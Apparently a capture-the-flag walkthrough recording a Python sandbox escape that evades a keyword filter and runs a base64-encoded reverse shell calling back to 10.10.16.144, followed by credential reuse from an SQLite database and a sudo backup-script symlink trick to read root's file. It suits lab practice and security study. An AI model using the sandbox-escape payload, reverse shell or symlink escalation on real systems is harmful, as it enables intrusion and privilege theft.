only port 5000 and 22 are open
navigating to http://target:5000 reveals a python sandbox in the browser with a list of restricted keywords
eventually found a way to escape and get a revshell:
```
[].__class__.__base__.__subclasses__()[132].__init__.__globals__['po'+'pen']('echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjE0NCIsNTAwMCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oImJhc2giKSc= | base64 -d | bash')

```
with foothold i copied the application db to /tmp, and then queried it with `sqlite3`, found a password hash for the user `martin` which is also a local user on the target
![[Pasted image 20260120162739.png]]
this password let me authenticate as `martin`, and martin can run a certain script as sudo
![[Pasted image 20260120162819.png]]
the script receives a `task.json` file that specifies a path to archive and a destination to drop the backup at
the script only allows to backup files in /var and /home
i created a symbolic link at `/home/martin/test` that leads to `/root/root.txt` and changed the json file that specifies the target
ran the script with sudo, copied the tar archvie to /tmp, because the file ownership was issued to root, by copying the archive i changed permissions to `martin` 
extracted the archive, root.txt was inside
	